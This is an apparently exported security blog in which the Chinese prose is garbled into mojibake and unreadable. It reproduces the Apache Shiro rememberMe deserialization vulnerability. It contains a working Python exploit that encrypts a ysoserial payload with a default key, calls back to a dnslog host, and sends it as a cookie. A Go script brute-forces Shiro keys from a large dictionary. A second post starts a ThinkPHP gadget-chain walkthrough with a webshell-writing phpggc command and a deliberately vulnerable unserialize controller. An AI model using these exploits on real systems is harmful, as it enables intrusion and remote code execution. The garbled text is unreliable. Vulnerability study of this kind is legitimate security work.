åœ¨org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLoginæ‰“ä¸‹æ–­ç‚¹, éšååœ¨æµè§ˆå™¨ä¸­é€‰ä¸­Remember Meé€‰é¡¹è¿›è¡Œç™»é™†, ç¨‹åºè¿›å…¥æ–­ç‚¹:\nåœ¨forgetIdentityå‡½æ•°ä¸­, ä¼šå°è¯•è·å–request å’Œ response, å¹¶ç§»é™¤ä¹‹å‰çš„èº«ä»½ä¿¡æ¯.\nå›åˆ°ä¹‹å‰çš„å‡½æ•°, è¿›å…¥ç¬¬ä¸€ä¸ªifåˆ†æ”¯, è¿›å…¥rememberIdentityå‡½æ•°, this.getIdentityToRememberå‡½æ•°è·å–åˆ°èº«ä»½ä¿¡æ¯, ç„¶åè°ƒç”¨rememberIdentityå‡½æ•°.\nrememberIdentityå‡½æ•°ä¸­, é¦–å…ˆå°†accountPrincipalsè½¬æ¢æˆbytes\nè½¬æ¢çš„é€»è¾‘ä¸ºå…ˆè¿›è¡Œåºåˆ—åŒ–ç„¶åå†è¿›è¡ŒåŠ å¯†, å¦‚ä¸‹\nåŠ å¯†çš„æ–¹å¼ä¸ºAESåŠ å¯†\nè·Ÿè¿›å¯†é’¥è·å–çš„å‡½æ•°\nä»æœ€åä¸€è¡Œå¯ä»¥çœ‹åˆ°,åœ¨å¯¹è±¡åˆå§‹åŒ–çš„æ—¶å€™, è‡ªåŠ¨è®¾ç½®å¯†é’¥ä¸ºé»˜è®¤å¯†é’¥\nè¿”å›åˆ°rememberIdentityå‡½æ•°, è·Ÿè¿›rememberSerializedIdentity, è¿™é‡Œä¸»è¦æ˜¯å°†åŠ å¯†ç»“æœç»è¿‡base64ä¹‹åå­˜å‚¨è¿›cookieä¸­\nrememberMeè§£å¯†è¿‡ç¨‹ åœ¨``org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity` æ‰“ä¸‹æ–­ç‚¹, ä½¿ç”¨è„šæœ¬å‘æœ¬åœ°æœåŠ¡å™¨å‘é€payload\nfrom Crypto.Cipher import AES import traceback import requests import subprocess import uuid import base64 target = \u0026#34;http://localhost:8000/web_war/\u0026#34; jar_file = \u0026#39;./ysoserial.jar\u0026#39; cipher_key = \u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34; popen = subprocess.Popen([\u0026#39;java\u0026#39;,\u0026#39;-jar\u0026#39;,jar_file, \u0026#34;URLDNS\u0026#34;, \u0026#34;http://ktclkl.dnslog.cn\u0026#34;], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(cipher_key), mode, iv) getget = popen.stdout.read() file_body = pad(getget) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) try: print(base64_ciphertext.decode()) r = requests.get(target, cookies={\u0026#39;rememberMe\u0026#39;:base64_ciphertext.decode()}, timeout=10) except: traceback.print_exc() è·Ÿè¿›å‡½æ•°, å‘ç°getRememberMeManagerä¼šè¿”å›cookieçš„ä¿¡æ¯, åŠ å¯†æœåŠ¡å’ŒåŠ å¯†è§£å¯†ç”¨çš„å¯†é’¥.\næ¥ä¸‹æ¥, è·Ÿè¿›getRememberedPrincipalså‡½æ•°, é¦–å…ˆä¼šå°è¯•è·å–rememberMeä¸­çš„åºåˆ—åŒ–å¯¹è±¡, ç„¶å\nçœ‹çœ‹getRememberedSerializedIdentityçš„å†…å®¹, ä¸»è¦ç¯èŠ‚å°±æ˜¯è·å–cookieå¹¶è¿›è¡Œbas64è§£å¯†, å¹¶å°†è§£å¯†ç»“æœè¿”å›å›å».\næ¥ä¸‹æ¥è¿›å…¥ convertBytesToPrincipalså‡½æ•°, å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿›è¡Œäº†è§£å¯†æ“ä½œ, å¹¶ä¸”è¿›è¡Œäº†ååºåˆ—åŒ–æ“ä½œ. è§£å¯†æ“ä½œå’Œä¹‹å‰çš„åŠ å¯†æ“ä½œç±»ä¼¼,\nè‡³æ­¤ , ååºåˆ—åŒ–æ¼æ´è§¦å‘. æ€»ä½“æ¥è¯´è¿™ä¸ªæ¼æ´è·Ÿèµ·æ¥å¹¶ä¸å¤æ‚.\nå¯†é’¥çˆ†ç ´ è¿™é‡Œå‚è€ƒhttps://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQçš„æ–¹æ³•ç¼–å†™è‡ªå·±çš„shiroæ£€æµ‹è„šæœ¬, è„šæœ¬ä¸­çš„å¯†é’¥å­—å…¸æ¥æºäºhttps://github.com/pmiaowu/BurpShiroPassiveScançš„ä»£ç \npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/base64\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; ) func main() { args := os.Args[1:] if len(args) \u0026lt; 1 { log.Println(\u0026#34;usage: ./shiro-brute-key {url}\u0026#34;) log.Println(\u0026#34;\\033[31mNo args specific, exit\\033[0m\u0026#34;) return } var url string = args[0] // start to detect shiro if detectShiro(url) != true { log.Println(\u0026#34;\\033[31mSeems no shiro, exit\\033[0m\u0026#34;) return } log.Println(\u0026#34;\\033[32mShiro detected!\\033[0m\u0026#34;) log.Println(\u0026#34;\\033[34mStart bruting key......\\033[0m\u0026#34;) var result bool var key string if result, key = bruteKey(url);result!=true { log.Println(\u0026#34;\\033[31mBrute failed!\\033[0m\u0026#34;) return } log.Println(\u0026#34;\\033[33mBrute success!Key: \u0026#34; + key + \u0026#34; \\033[0m\u0026#34;) return } func detectShiro(url string) (result bool) { client := \u0026amp;http.Client{Timeout: time.Second * 10} req, _ := http.NewRequest(\u0026#34;GET\u0026#34;, url, nil) req.Header.Add(\u0026#34;Cookie\u0026#34;, \u0026#34;rememberMe=1\u0026#34;) req.Header.Add(\u0026#34;User-Agent\u0026#34;, \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0\u0026#34;) resp, err := client.Do(req) if err != nil { log.Println(\u0026#34;Error with http request,please check your url\u0026#34;) return } setCookies := resp.Cookies() for _, cookie := range setCookies { if strings.Contains(cookie.String(), \u0026#34;rememberMe=deleteMe\u0026#34;) { log.Println(\u0026#34;Found return cookie: \u0026#34; + cookie.String()) return true } } return false } func bruteKey(url string) (bool, string) { key_dict := [...]string{ \u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;, \u0026#34;Z3VucwAAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;wGiHplamyXlVB11UXWol8g==\u0026#34;, \u0026#34;2AvVhdsgUs0FSA3SDFAdag==\u0026#34;, \u0026#34;3AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;4AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;bWljcm9zAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;WcfHGU25gNnTxTlmJMeSpw==\u0026#34;, \u0026#34;fCq+/xW488hMTCD+cmJ3aQ==\u0026#34;, \u0026#34;kPv59vyqzj00x11LXJZTjJ2UHW48jzHN\u0026#34;, \u0026#34;6ZmI6I2j5Y+R5aSn5ZOlAA==\u0026#34;, \u0026#34;1QWLxg+NYmxraMoxAXu/Iw==\u0026#34;, \u0026#34;a2VlcE9uR29pbmdBbmRGaQ==\u0026#34;, \u0026#34;5aaC5qKm5oqA5pyvAAAAAA==\u0026#34;, \u0026#34;1AvVhdsgUs0FSA3SDFAdag==\u0026#34;, \u0026#34;5RC7uBZLkByfFfJm22q/Zw==\u0026#34;, \u0026#34;3AvVhdAgUs0FSA4SDFAdBg==\u0026#34;, \u0026#34;a3dvbmcAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;eXNmAAAAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;U0hGX2d1bnMAAAAAAAAAAA==\u0026#34;, \u0026#34;Ymx1ZXdoYWxlAAAAAAAAAA==\u0026#34;, \u0026#34;L7RioUULEFhRyxM7a2R/Yg==\u0026#34;, \u0026#34;UGlzMjAxNiVLeUVlXiEjLw==\u0026#34;, \u0026#34;bWluZS1hc3NldC1rZXk6QQ==\u0026#34;, \u0026#34;ZUdsaGJuSmxibVI2ZHc9PQ==\u0026#34;, \u0026#34;7AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;MTIzNDU2Nzg5MGFiY2RlZg==\u0026#34;, \u0026#34;OY//C4rhfwNxCQAQCrQQ1Q==\u0026#34;, \u0026#34;bTBANVpaOUw0ampRWG43TVJFcF5iXjdJ\u0026#34;, \u0026#34;FP7qKJzdJOGkzoQzo2wTmA==\u0026#34;, \u0026#34;nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3\u0026#34;, \u0026#34;LEGEND-CAMPUS-CIPHERKEY==\u0026#34;, \u0026#34;r0e3c16IdVkouZgk1TKVMg==\u0026#34;, \u0026#34;ZWvohmPdUsAWT3=KpPqda\u0026#34;, \u0026#34;k3+XHEg6D8tb2mGm7VJ3nQ==\u0026#34;, \u0026#34;U3ByaW5nQmxhZGUAAAAAAA==\u0026#34;, \u0026#34;tiVV6g3uZBGfgshesAQbjA==\u0026#34;, \u0026#34;ZAvph3dsQs0FSL3SDFAdag==\u0026#34;, \u0026#34;0AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;25BsmdYwjnfcWmnhAciDDg==\u0026#34;, \u0026#34;3JvYhmBLUs0ETA5Kprsdag==\u0026#34;, \u0026#34;5AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;6AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;6NfXkC7YVCV5DASIrEm1Rg==\u0026#34;, \u0026#34;cmVtZW1iZXJNZQAAAAAAAA==\u0026#34;, \u0026#34;8AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;8BvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;9AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;OUHYQzxQ/W9e/UjiAGu6rg==\u0026#34;, \u0026#34;aU1pcmFjbGVpTWlyYWNsZQ==\u0026#34;, \u0026#34;bXRvbnMAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;5J7bIJIV0LQSN3c9LPitBQ==\u0026#34;, \u0026#34;bya2HkYo57u6fWh5theAWw==\u0026#34;, \u0026#34;f/SY5TIve5WWzT4aQlABJA==\u0026#34;, \u0026#34;WuB+y2gcHRnY2Lg9+Aqmqg==\u0026#34;, \u0026#34;3qDVdLawoIr1xFd6ietnwg==\u0026#34;, \u0026#34;YI1+nBV//m7ELrIyDHm6DQ==\u0026#34;, \u0026#34;6Zm+6I2j5Y+R5aS+5ZOlAA==\u0026#34;, \u0026#34;2A2V+RFLUs+eTA3Kpr+dag==\u0026#34;, \u0026#34;6ZmI6I2j3Y+R1aSn5BOlAA==\u0026#34;, \u0026#34;SkZpbmFsQmxhZGUAAAAAAA==\u0026#34;, \u0026#34;2cVtiE83c4lIrELJwKGJUw==\u0026#34;, \u0026#34;fsHspZw/92PrS3XrPW+vxw==\u0026#34;, \u0026#34;XTx6CKLo/SdSgub+OPHSrw==\u0026#34;, \u0026#34;sHdIjUN6tzhl8xZMG3ULCQ==\u0026#34;, \u0026#34;O4pdf+7e+mZe8NyxMTPJmQ==\u0026#34;, \u0026#34;HWrBltGvEZc14h9VpMvZWw==\u0026#34;, \u0026#34;rPNqM6uKFCyaL10AK51UkQ==\u0026#34;, \u0026#34;Y1JxNSPXVwMkyvES/kJGeQ==\u0026#34;, \u0026#34;lT2UvDUmQwewm6mMoiw4Ig==\u0026#34;, \u0026#34;MPdCMZ9urzEA50JDlDYYDg==\u0026#34;, \u0026#34;xVmmoltfpb8tTceuT5R7Bw==\u0026#34;, \u0026#34;c+3hFGPjbgzGdrC+MHgoRQ==\u0026#34;, \u0026#34;ClLk69oNcA3m+s0jIMIkpg==\u0026#34;, \u0026#34;Bf7MfkNR0axGGptozrebag==\u0026#34;, \u0026#34;1tC/xrDYs8ey+sa3emtiYw==\u0026#34;, \u0026#34;ZmFsYWRvLnh5ei5zaGlybw==\u0026#34;, \u0026#34;cGhyYWNrY3RmREUhfiMkZA==\u0026#34;, \u0026#34;IduElDUpDDXE677ZkhhKnQ==\u0026#34;, \u0026#34;yeAAo1E8BOeAYfBlm4NG9Q==\u0026#34;, \u0026#34;cGljYXMAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;2itfW92XazYRi5ltW0M2yA==\u0026#34;, \u0026#34;XgGkgqGqYrix9lI6vxcrRw==\u0026#34;, \u0026#34;ertVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;5AvVhmFLUS0ATA4Kprsdag==\u0026#34;, \u0026#34;s0KTA3mFLUprK4AvVhsdag==\u0026#34;, \u0026#34;hBlzKg78ajaZuTE0VLzDDg==\u0026#34;, \u0026#34;9FvVhtFLUs0KnA3Kprsdyg==\u0026#34;, \u0026#34;d2ViUmVtZW1iZXJNZUtleQ==\u0026#34;, \u0026#34;yNeUgSzL/CfiWw1GALg6Ag==\u0026#34;, \u0026#34;NGk/3cQ6F5/UNPRh8LpMIg==\u0026#34;, \u0026#34;4BvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;MzVeSkYyWTI2OFVLZjRzZg==\u0026#34;, \u0026#34;CrownKey==a12d/dakdad\u0026#34;, \u0026#34;empodDEyMwAAAAAAAAAAAA==\u0026#34;, \u0026#34;A7UzJgh1+EWj5oBFi+mSgw==\u0026#34;, \u0026#34;c2hpcm9fYmF0aXMzMgAAAA==\u0026#34;, \u0026#34;i45FVt72K2kLgvFrJtoZRw==\u0026#34;, \u0026#34;66v1O8keKNV3TTcGPK1wzg==\u0026#34;, \u0026#34;U3BAbW5nQmxhZGUAAAAAAA==\u0026#34;, \u0026#34;ZnJlc2h6Y24xMjM0NTY3OA==\u0026#34;, \u0026#34;Jt3C93kMR9D5e8QzwfsiMw==\u0026#34;, \u0026#34;MTIzNDU2NzgxMjM0NTY3OA==\u0026#34;, \u0026#34;vXP33AonIp9bFwGl7aT7rA==\u0026#34;, \u0026#34;V2hhdCBUaGUgSGVsbAAAAA==\u0026#34;, \u0026#34;Q01TX0JGTFlLRVlfMjAxOQ==\u0026#34;, \u0026#34;Is9zJ3pzNh2cgTHB4ua3+Q==\u0026#34;, \u0026#34;SDKOLKn2J1j/2BHjeZwAoQ==\u0026#34;, \u0026#34;NsZXjXVklWPZwOfkvk6kUA==\u0026#34;, \u0026#34;GAevYnznvgNCURavBhCr1w==\u0026#34;, \u0026#34;zSyK5Kp6PZAAjlT+eeNMlg==\u0026#34;, \u0026#34;bXdrXl9eNjY2KjA3Z2otPQ==\u0026#34;, \u0026#34;RVZBTk5JR0hUTFlfV0FPVQ==\u0026#34;, \u0026#34;WkhBTkdYSUFPSEVJX0NBVA==\u0026#34;, \u0026#34;GsHaWo4m1eNbE0kNSMULhg==\u0026#34;, \u0026#34;l8cc6d2xpkT1yFtLIcLHCg==\u0026#34;, \u0026#34;KU471rVNQ6k7PQL4SqxgJg==\u0026#34;, \u0026#34;kPH+bIxk5D2deZiIxcabaA==\u0026#34;, \u0026#34;kPH+bIxk5D2deZiIxcacaA==\u0026#34;, \u0026#34;4AvVhdsgUs0F563SDFAdag==\u0026#34;, \u0026#34;FL9HL9Yu5bVUJ0PDU1ySvg==\u0026#34;, \u0026#34;fdCEiK9YvLC668sS43CJ6A==\u0026#34;, \u0026#34;FJoQCiz0z5XWz2N2LyxNww==\u0026#34;, \u0026#34;HeUZ/LvgkO7nsa18ZyVxWQ==\u0026#34;, \u0026#34;HoTP07fJPKIRLOWoVXmv+Q==\u0026#34;, \u0026#34;iycgIIyCatQofd0XXxbzEg==\u0026#34;, \u0026#34;m0/5ZZ9L4jjQXn7MREr/bw==\u0026#34;, \u0026#34;NoIw91X9GSiCrLCF03ZGZw==\u0026#34;, \u0026#34;oPH+bIxk5E2enZiIxcqaaA==\u0026#34;, \u0026#34;QAk0rp8sG0uJC4Ke2baYNA==\u0026#34;, \u0026#34;Rb5RN+LofDWJlzWAwsXzxg==\u0026#34;, \u0026#34;s2SE9y32PvLeYo+VGFpcKA==\u0026#34;, \u0026#34;SrpFBcVD89eTQ2icOD0TMg==\u0026#34;, \u0026#34;Us0KvVhTeasAm43KFLAeng==\u0026#34;, \u0026#34;YWJjZGRjYmFhYmNkZGNiYQ==\u0026#34;, \u0026#34;zIiHplamyXlVB11UXWol8g==\u0026#34;, \u0026#34;ZjQyMTJiNTJhZGZmYjFjMQ==\u0026#34;, \u0026#34;kPv59vyqzj00x11LXJZTjJ2UHW48jzHN\u0026#34;, \u0026#34;2adsfasdqerqerqewradsf==\u0026#34;, \u0026#34;2AvVCXsxUs0FSA7SYFjdQg==\u0026#34;, \u0026#34;2AvVhdsgERdsSA3SDFAdag==\u0026#34;, \u0026#34;2AvVhdsgUs0FSA3SaFAdfg==\u0026#34;, \u0026#34;2AvVhdsgUs0FSA3SDFAder==\u0026#34;, \u0026#34;2AvVhdsgUsOFSA3SDFAdag==\u0026#34;, \u0026#34;2AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;2AvVidsaUSofSA3SDFAdog==\u0026#34;, \u0026#34;3Av2hmFLAs0BTA3Kprsd6E==\u0026#34;, \u0026#34;3AvVhdAgUs1FSA4SDFAdBg==\u0026#34;, \u0026#34;3AvVhMFLIs0KTA3Kprsdag==\u0026#34;, \u0026#34;3AvVhmFLUs0KTA3KaTHGFg==\u0026#34;, \u0026#34;3AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;3qDVdLawoIr1xFd6ietnsg==\u0026#34;, \u0026#34;3rvVhmFLUs0KAT3Kprsdag==\u0026#34;, \u0026#34;4AvVhm2LUs0KTA3Kprsdag==\u0026#34;, \u0026#34;4AvVhmFLUs0KTA3KAAAAAA==\u0026#34;, \u0026#34;4AvVhmFLUs0KTA3Kprseaf==\u0026#34;, \u0026#34;4AvVhmFLUs0TTA3Kprsdag==\u0026#34;, \u0026#34;4AvVhmFLUs5KTA1Kprsdag==\u0026#34;, \u0026#34;4AvVhmFLUsOKTA3Kprsdag==\u0026#34;, \u0026#34;4rvVhmFLUs0KAT3Kprsdag==\u0026#34;, \u0026#34;4WCZSJyqdUQsije93aQIRg==\u0026#34;, \u0026#34;5AvVhCsgUs0FSA3SDFAdag==\u0026#34;, \u0026#34;5oiR5piv5p2h5ZK46bG8IQ==\u0026#34;, \u0026#34;8AvVhdsgUs0FSA3SDFAdag==\u0026#34;, \u0026#34;9Ami6v2G5Y+r5aPnE4OlBB==\u0026#34;, \u0026#34;9AVvhnFLuS3KTV8KprsdAg==\u0026#34;, \u0026#34;AF05JAuyuEB1ouJQ9Y9Phg==\u0026#34;, \u0026#34;aG91c2Vob3VzZWhvdXNlMg==\u0026#34;, \u0026#34;A+kWR7o9O0/G/W6aOGesRA==\u0026#34;, \u0026#34;AztiX2RUqhc7dhOzl1Mj8Q==\u0026#34;, \u0026#34;b2EAAAAAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;B9rPF8FHhxKJZ9k63ik7kQ==\u0026#34;, \u0026#34;c2hvdWtlLXBsdXMuMjAxNg==\u0026#34;, \u0026#34;Cj6LnKZNLEowAZrdqyH/Ew==\u0026#34;, \u0026#34;duhfin37x6chw29jsne45m==\u0026#34;, \u0026#34;fCq+/xW488hMTCE+cmJ3FF==\u0026#34;, \u0026#34;FjbNm1avvGmWE9CY2HqV75==\u0026#34;, \u0026#34;FP7qKJzdJOGkzoQzo2wTmA==\u0026#34;, \u0026#34;GhrF5zLfq1Dtadd1jlohhA==\u0026#34;, \u0026#34;GHxH6G3LFh8Zb3NwoRgfFA==\u0026#34;, \u0026#34;HOlg7NHb9potm0n5s4ic0Q==\u0026#34;, \u0026#34;lt181dcQVz/Bo9Wb8ws/Cg==\u0026#34;, \u0026#34;M2djA70UBBUPDibGZBRvrA==\u0026#34;, \u0026#34;mIccZhQt6EBHrZIyw1FAXQ==\u0026#34;, \u0026#34;pbnA+Qzen1vjV3rNqQBLHg==\u0026#34;, \u0026#34;pyyX1c5x2f0LZZ7VKZXjKO==\u0026#34;, \u0026#34;QDFCnfkLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;QF5HMyZAWDZYRyFnSGhTdQ==\u0026#34;, \u0026#34;qQFtSnnj/sx7vu51ixAyEQ==\u0026#34;, \u0026#34;QUxQSEFNWVNPRlRCVUlMRA==\u0026#34;, \u0026#34;QVN1bm5uJ3MgU3Vuc2l0ZQ==\u0026#34;, \u0026#34;R29yZG9uV2ViAAAAAAAAAA==\u0026#34;, \u0026#34;sBv2t3okbdm3U0r2EVcSzB==\u0026#34;, \u0026#34;sgIQrqUVxa1OZRRIK3hLZw==\u0026#34;, \u0026#34;TGMPe7lGO/Gbr38QiJu1/w==\u0026#34;, \u0026#34;UGlzMjAxNiVLeUVlXiEjLw==\u0026#34;, \u0026#34;w793pPq5ZVBKkj8OhV4KaQ==\u0026#34;, \u0026#34;wrjUh2ttBPQLnT4JVhriug==\u0026#34;, \u0026#34;wyLZMDifwq3sW1vhhHpgKA==\u0026#34;, \u0026#34;YnlhdnMAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;YVd4dmRtVjViM1UlM0QIdn==\u0026#34;, \u0026#34;YWdlbnRAZG1AMjAxOHN3Zg==\u0026#34;, \u0026#34;YystomRZLMUjiK0Q1+LFdw==\u0026#34;, \u0026#34;Z3VucwAAAAAAAAAAAAABBB==\u0026#34;, \u0026#34;Z3VucwACAOVAKALACAADSA==\u0026#34;} for _, key := range key_dict { log.Println(\u0026#34;\\033[34mTry key: \u0026#34;+ key + \u0026#34;\\033[0m\u0026#34;) rememberMe := generateRememberMe(key) if rememberMe == \u0026#34;\u0026#34; {continue} client := \u0026amp;http.Client{Timeout: time.Second * 10} req, _ := http.NewRequest(\u0026#34;GET\u0026#34;, url, nil) req.Header.Add(\u0026#34;Cookie\u0026#34;, \u0026#34;rememberMe=\u0026#34;+rememberMe) req.Header.Add(\u0026#34;User-Agent\u0026#34;, \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0\u0026#34;) resp, err := client.Do(req) time.Sleep(time.Second * 2) if err != nil { log.Panicln(\u0026#34;Error with http request,please check your url\u0026#34;) } setCookies := resp.Cookies() for _, cookie := range setCookies { log.Println(cookie.String()) if strings.Contains(cookie.String(), \u0026#34;rememberMe=deleteMe\u0026#34;) { return false, \u0026#34;\u0026#34; } } return true, key } return false, \u0026#34;\u0026#34; } func generateRememberMe(key string) string { bIV := []byte(\u0026#34;1234567890123456\u0026#34;) bKey, err := base64.StdEncoding.DecodeString(key) if err != nil {return \u0026#34;\u0026#34;} payload := \u0026#34;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==\u0026#34; bPayload, _ := base64.StdEncoding.DecodeString(payload) bPayload = PKCS5Padding(bPayload, aes.BlockSize) block, err := aes.NewCipher(bKey) if err != nil { log.Panicln(err) } ciphertext := make([]byte, aes.BlockSize + len(bPayload)) mode := cipher.NewCBCEncrypter(block, bIV) mode.CryptBlocks(ciphertext[aes.BlockSize:], bPayload) copy(ciphertext[:aes.BlockSize], bIV) return base64.StdEncoding.EncodeToString(ciphertext) } func PKCS5Padding(ciphertext []byte, blockSize int) []byte { padding := (blockSize - len(ciphertext)%blockSize) padtext := bytes.Repeat([]byte{byte(padding)}, padding) return append(ciphertext, padtext...) } ","permalink":"https://dragonbox.top/posts/sec-shiro-attack/","summary":"\u003cblockquote\u003e\n\u003cp\u003eè®°å½•shiroæ¼æ´å­¦ä¹ çš„è¿‡ç¨‹, å‚è€ƒhttps://saucer-man.com/information_security/396.html, å¹¶åœ¨æ¼æ´åˆ†æåŸºç¡€ä¸Šç¼–å†™æ£€æµ‹è„šæœ¬\u003c/p\u003e\n\u003c/blockquote\u003e","title":"shiro æ¼æ´å¤ç°"},{"content":" phpggcä¸­å…³äºthinkphpçš„æ”»å‡»æ€è·¯å­¦ä¹ \n5.0.4-5.0.24 å†™æ–‡ä»¶ ä½¿ç”¨ç”¨æ³•\nç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦å†™åˆ°å“ªä¸ªæ–‡ä»¶å¤¹ä¸‹é¢,ç¬¬äºŒä¸ªå‚æ•°æ˜¯æœ¬åœ°çš„æ–‡ä»¶è·¯å¾„,åé¢base64ä¼šå°†æ¢è¡Œç¬¦å·å»é™¤ ./phpggc ThinkPHP/FW1 /srv/http/tp5/ shell.php | base64 -w 0 ç¯å¢ƒæ­å»º åœ¨controllerä¸‹é¢çš„Index.phpä¸­å†™å…¥ååºåˆ—åŒ–ä»£ç \n\u0026lt;?php namespace app\\index\\controller; class Index { public function index() { unserialize(base64_decode($_GET[\u0026#39;a\u0026#39;])); } } æ¼æ´åˆ†æ è°ƒè¯•å¼€å§‹, é¦–å…ˆåœ¨think\\Process#__destructä¸‹æ–­ç‚¹, éšåè·Ÿè¿›åˆ°closeå‡½æ•°ä¸­,è¿™é‡Œæ§åˆ¶processPipesä¸ºthink\\model\\relation\\HasManyå¯¹è±¡,è§¦å‘å…¶__callæ–¹æ³•,è¿›è€Œè¿›å…¥å…¶baseQuery æ–¹æ³•. åœ¨è¿™ä¸ªæ–¹æ³•ä¸­å¯ä»¥è§¦å‘think\\console\\Outputçš„__callæ–¹æ³•\nåœ¨è¿™ä¸ª__callæ–¹æ³•ä¸­,å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†call_user_func_arrayå‡½æ•°, è°ƒç”¨çš„æ˜¯blockå‡½æ•°, å‚æ•°æ˜¯æˆ‘ä»¬æ§åˆ¶çš„payload\nè¿™é‡Œå‰é¢çš„AAAæ˜¯ä¸ºäº†ç»•è¿‡åæ–‡ä¸­å‡ºç°çš„æ­»äº¡exitè€Œæ·»åŠ çš„.åé¢å†è¯´.\nåˆç»è¿‡äº†think\\console\\Outputçš„writeln å’Œwrite æ–¹æ³•åè¿›å…¥ think\\session\\driver\\Memcache#write,\nhandleræ˜¯think\\cache\\driver\\Memcachedå¯¹è±¡,è¿›å…¥å…¶setæ–¹æ³•\n\u0026lt;butu\nè¿›å…¥setæ–¹æ³•ä¸­çš„hasæ–¹æ³•\nhandleræ˜¯think\\cache\\driver\\Fileå¯¹è±¡,getæ–¹æ³•è°ƒç”¨äº†getCacheKeyæ–¹æ³•\nè¿”å›ç»“æœä¸ºphp://filter/convert.base64-decode/resource=/srv/http/tp5/6a644d26b09257b882dae6e407f23d42.php, å› ä¸ºè¿™ä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶,æ‰€ä»¥è¿”å›äº†defaultçš„å€¼ä¹Ÿå°±æ˜¯false, é‚£ä¹ˆå‰é¢æåˆ°çš„think\\cache\\driver\\Memcached#hasè¿”å›çš„ä¹Ÿæ˜¯false.\nå›åˆ°think\\cache\\driver\\Memcached#set,è¿›å…¥think\\cache\\driver\\Memcached#getCacheKey,è¿”å›çš„keyæ˜¯\u0026lt;where\u0026gt;AAAPD9waHAgcGhwaW5mbygpOz8+Cg++\u0026lt;/where\u0026gt;\néšåè¿›å…¥ä¸‹é¢ä¸€è¡Œçš„think\\cache\\driver\\File#set, æ³¨æ„è¿™é‡Œæ˜¯ç¬¬ä¸€æ¬¡è¿›å…¥think\\cache\\driver\\File#set .\nåœ¨è¿™ä¸ªsetæ–¹æ³•ä¸­è°ƒç”¨getCacheKeyæ–¹æ³•, å’Œä¹‹å‰ä¸€æ ·è¿”å›çš„æ˜¯php://filter/convert.base64-decode/resource=/srv/http/tp5/6a644d26b09257b882dae6e407f23d42 , ç„¶ååœ¨ä¸‹æ–‡è¿›è¡Œä¸€æ¬¡æ–‡ä»¶å†™,ä½†æ˜¯è¿™é‡Œå†™å‡ºæ¥çš„æ–‡ä»¶ä¸æ˜¯ç›®æ ‡æ–‡ä»¶!, ä½ çœ‹:\nexitåé¢ä¸æ˜¯æˆ‘ä»¬çš„payload, ä½†æ˜¯åˆ«ç€æ€¥, ä¹‹åè¿˜ä¼šå›æ¥è¿™é‡Œä¸€æ¬¡, é‚£æ¬¡å°±ä¼šå°†payloadå†™è¿›å»äº†.\nè¿™ä¸€æ­¥ä¹‹å, è¿”å›think\\cache\\driver\\Memcached#set, å¹¶éšä¹‹è°ƒç”¨setTagItemæ–¹æ³•\ntagçš„ç”Ÿæˆæ˜¯æ ¹æ®this-\u0026gt;tagçš„md5å€¼æ¥å†³å®šçš„, è¿™é‡Œthis-\u0026gt;tagæ˜¯null, æ‰€ä»¥ç”Ÿæˆçš„tagæ˜¯æˆ‘ä»¬å¯ä»¥é¢„æµ‹çš„å€¼ä¹Ÿå°±æ˜¯tag_c4ca4238a0b923820dcc509a6f75849b, ç„¶åå¸¦ç€è¿™ä¸ªtagå€¼å’Œæˆ‘ä»¬çš„payloadä½œä¸ºkeyå’Œvalue , å†æ¬¡è¿›å…¥think\\cache\\driver\\Memcached#setæ–¹æ³•, å¹¶åœ¨å…¶ä¸­ç¬¬äºŒæ¬¡è¿›å…¥think\\cache\\driver\\File#setæ–¹æ³•\næ³¨æ„åˆ°å’Œç¬¬ä¸€æ¬¡è¿›å…¥think\\cache\\driver\\File#setæœ‰ä»€ä¹ˆä¸ä¸€æ ·å—? 